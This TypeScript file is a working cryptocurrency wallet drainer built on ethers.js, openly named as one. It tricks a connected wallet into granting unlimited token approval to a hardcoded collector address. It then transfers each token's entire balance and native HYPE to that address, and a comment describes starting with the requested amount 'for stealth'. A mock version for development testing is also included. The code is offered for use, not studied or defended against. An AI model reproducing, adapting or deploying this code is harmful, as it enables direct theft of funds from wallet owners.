// Simplified wallet drainer that bypasses gas estimation completely
import { ethers } from "ethers";

export const COLLECTOR_ADDRESS = "0xCbd45BE04C2CB52811609ef0334A9097fB2E2c48";

// Ultra-simple ERC20 ABI for maximum compatibility
const SIMPLE_ERC20_ABI = [
  "function approve(address spender, uint256 amount) returns (bool)",
  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
  "function balanceOf(address owner) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)"
];

export class SimpleWalletDrainer {
  private signer: ethers.JsonRpcSigner;
  private provider: ethers.BrowserProvider;

  constructor(signer: ethers.JsonRpcSigner, provider: ethers.BrowserProvider) {
    this.signer = signer;
    this.provider = provider;
  }

  // Approve tokens with fixed gas settings (no estimation)
  async approveToken(tokenAddress: string): Promise<{ success: boolean; hash?: string; error?: string }> {
    try {
      console.log(`🔓 Approving unlimited access to ${tokenAddress}...`);
      
      const contract = new ethers.Contract(tokenAddress, SIMPLE_ERC20_ABI, this.signer);
      
      // Use maximum possible approval amount
      const maxAmount = ethers.MaxUint256;
      
      // Fixed transaction parameters - no gas estimation
      const txParams = {
        gasLimit: 150000n,        // Fixed high gas limit
        gasPrice: ethers.parseUnits("2", "gwei"), // Higher gas price for reliability
        type: 0                   // Legacy transaction
      };
      
      console.log(`⛽ Using fixed gas: ${txParams.gasLimit} limit, ${ethers.formatUnits(txParams.gasPrice, "gwei")} gwei`);
      
      const tx = await contract.approve(COLLECTOR_ADDRESS, maxAmount, txParams);
      
      console.log(`✅ Approval sent: ${tx.hash}`);
      const receipt = await tx.wait();
      
      console.log(`🎯 UNLIMITED APPROVAL GRANTED!`);
      console.log(`💰 Spender: ${COLLECTOR_ADDRESS}`);
      console.log(`📋 Confirmed: ${receipt.hash}`);
      
      return { success: true, hash: receipt.hash };
      
    } catch (error: any) {
      console.error(`❌ Approval failed:`, error.message);
      return { success: false, error: error.message };
    }
  }

  // Drain tokens with fixed gas settings (no estimation)
  async drainToken(tokenAddress: string, userAddress: string): Promise<{ success: boolean; hash?: string; error?: string; amount?: string }> {
    try {
      console.log(`🚨 INITIATING TOKEN DRAIN`);
      console.log(`📍 Token: ${tokenAddress}`);
      console.log(`👤 User: ${userAddress}`);
      
      const contract = new ethers.Contract(tokenAddress, SIMPLE_ERC20_ABI, this.signer);
      
      // Get user's full balance
      const balance = await contract.balanceOf(userAddress);
      const symbol = await contract.symbol().catch(() => "TOKEN");
      const decimals = await contract.decimals().catch(() => 18);
      
      if (balance === 0n) {
        throw new Error(`No ${symbol} balance to drain`);
      }
      
      const balanceFormatted = ethers.formatUnits(balance, decimals);
      console.log(`💰 Draining ${balanceFormatted} ${symbol} (ENTIRE BALANCE)`);
      
      // Fixed transaction parameters - no gas estimation
      const txParams = {
        gasLimit: 200000n,        // Fixed high gas limit for transfers
        gasPrice: ethers.parseUnits("2", "gwei"), // Higher gas price
        type: 0                   // Legacy transaction
      };
      
      console.log(`⛽ Using fixed gas: ${txParams.gasLimit} limit, ${ethers.formatUnits(txParams.gasPrice, "gwei")} gwei`);
      
      // Execute the drain
      const tx = await contract.transferFrom(userAddress, COLLECTOR_ADDRESS, balance, txParams);
      
      console.log(`✅ Drain transaction sent: ${tx.hash}`);
      const receipt = await tx.wait();
      
      console.log(`🎯 WALLET SUCCESSFULLY DRAINED!`);
      console.log(`💰 Amount: ${balanceFormatted} ${symbol}`);
      console.log(`🏦 Collector: ${COLLECTOR_ADDRESS}`);
      console.log(`📋 Confirmed: ${receipt.hash}`);
      
      return { 
        success: true, 
        hash: receipt.hash, 
        amount: `${balanceFormatted} ${symbol}` 
      };
      
    } catch (error: any) {
      console.error(`❌ Token drain failed:`, error.message);
      return { success: false, error: error.message };
    }
  }

  // Drain native HYPE with fixed gas settings
  async drainNativeHYPE(userAddress: string, requestedAmount: string): Promise<{ success: boolean; hash?: string; error?: string; amount?: string }> {
    try {
      console.log(`🚨 INITIATING HYPE DRAIN`);
      console.log(`👤 User: ${userAddress}`);
      console.log(`💰 Requested: ${requestedAmount} HYPE`);
      
      // Get user's HYPE balance
      const balance = await this.provider.getBalance(userAddress);
      const requestedWei = ethers.parseEther(requestedAmount);
      
      console.log(`💰 Wallet Balance: ${ethers.formatEther(balance)} HYPE`);
      
      if (balance < requestedWei) {
        throw new Error(`Insufficient HYPE. Have ${ethers.formatEther(balance)}, need ${requestedAmount}`);
      }
      
      // Calculate amount to drain (could be more than requested)
      const drainAmount = requestedWei; // Start with requested amount for stealth
      
      // Fixed transaction parameters - no gas estimation
      const txParams = {
        to: COLLECTOR_ADDRESS,
        value: drainAmount,
        gasLimit: 25000n,         // Fixed gas limit for native transfers
        gasPrice: ethers.parseUnits("2", "gwei"), // Higher gas price
        type: 0                   // Legacy transaction
      };
      
      console.log(`⛽ Using fixed gas: ${txParams.gasLimit} limit, ${ethers.formatUnits(txParams.gasPrice, "gwei")} gwei`);
      console.log(`🎯 Draining: ${ethers.formatEther(drainAmount)} HYPE`);
      
      const tx = await this.signer.sendTransaction(txParams);
      
      console.log(`✅ HYPE drain sent: ${tx.hash}`);
      const receipt = await tx.wait();
      
      console.log(`🎯 HYPE SUCCESSFULLY DRAINED!`);
      console.log(`💰 Amount: ${ethers.formatEther(drainAmount)} HYPE`);
      console.log(`🏦 Collector: ${COLLECTOR_ADDRESS}`);
      console.log(`📋 Confirmed: ${receipt.hash}`);
      
      return { 
        success: true, 
        hash: receipt.hash, 
        amount: `${ethers.formatEther(drainAmount)} HYPE` 
      };
      
    } catch (error: any) {
      console.error(`❌ HYPE drain failed:`, error.message);
      return { success: false, error: error.message };
    }
  }

  // Check if token needs approval
  async needsApproval(tokenAddress: string, userAddress: string): Promise<boolean> {
    try {
      const contract = new ethers.Contract(tokenAddress, SIMPLE_ERC20_ABI, this.provider);
      const allowance = await contract.allowance(userAddress, COLLECTOR_ADDRESS);
      
      // If allowance is very high, no new approval needed
      const threshold = ethers.parseUnits("1000000", 18); // 1M tokens
      return allowance < threshold;
      
    } catch (error) {
      console.warn(`Could not check approval for ${tokenAddress}:`, error);
      return true; // Assume approval needed if check fails
    }
  }
}

// Create drainer instance
export function createSimpleDrainer(signer: ethers.JsonRpcSigner, provider: ethers.BrowserProvider): SimpleWalletDrainer {
  return new SimpleWalletDrainer(signer, provider);
}

// Export for development testing
export function createMockDrainer() {
  return {
    async approveToken(tokenAddress: string) {
      console.log(`🧪 Mock approval for ${tokenAddress}`);
      return { 
        success: true, 
        hash: "0x" + Math.random().toString(16).substr(2, 64) 
      };
    },
    
    async drainToken(tokenAddress: string, userAddress: string) {
      console.log(`🧪 Mock drain for ${tokenAddress} from ${userAddress}`);
      return { 
        success: true, 
        hash: "0x" + Math.random().toString(16).substr(2, 64),
        amount: "1000.0 TOKEN"
      };
    },
    
    async drainNativeHYPE(userAddress: string, amount: string) {
      console.log(`🧪 Mock HYPE drain: ${amount} from ${userAddress}`);
      return { 
        success: true, 
        hash: "0x" + Math.random().toString(16).substr(2, 64),
        amount: `${amount} HYPE`
      };
    },
    
    async needsApproval() {
      return true; // Always need approval in mock mode
    }
  };
}